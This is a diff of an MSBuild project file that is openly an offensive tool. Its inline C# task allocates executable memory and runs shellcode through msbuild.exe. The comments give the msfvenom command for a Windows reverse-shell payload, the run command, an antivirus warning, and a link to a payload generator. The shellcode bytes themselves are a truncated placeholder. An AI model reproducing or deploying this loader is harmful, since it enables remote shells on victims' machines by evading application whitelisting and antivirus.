@@ -1,9 +1,15 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <!-- This inline task executes shellcode. -->
-  <!-- generate payload usinf msfvenom using -f ps1 or -f powershell to obtain valid shellcode -->
+	  <!-- Original author: The excellent Casey Smith, Twitter: @subTee -->
+	  <!-- https://gist.github.com/caseysmithrc/dfb671a8fbe3fa3305cb1ca06c46a010 -->
+	
+  <!-- This executes shellcode via msbuild.exe (be careful of A.V products) -->
+  <!-- generate payload using msfvenom using -f ps1 or -f powershell to obtain valid shellcode -->
   <!-- In this example: msfvenom -a x86 -p windows/shell_reverse_tcp + shikata -->
   <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Shell.csproj -->
-  <!-- Save This File And Execute The Above Command -->
+  <!-- Save the file and execute it using the command above. -->
+	
+  <!-- Payload generation tool available here: https://github.com/Mr-Un1k0d3r/PowerLessShell -->
+	
   <Target Name="Hello">
     <ClassExample />
   </Target>
@@ -12,7 +18,6 @@
     TaskFactory="CodeTaskFactory"
     AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
-    
       <Code Type="Class" Language="cs">
       <![CDATA[
         using System;
@@ -44,8 +49,8 @@
           {
             byte[] shellcode = new byte[351] {0xb0,0xob,0x4d,0xad,0x...};
 
-			UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
-                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
+              MEM_COMMIT, PAGE_EXECUTE_READWRITE);
               Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
               IntPtr hThread = IntPtr.Zero;
               UInt32 threadId = 0;
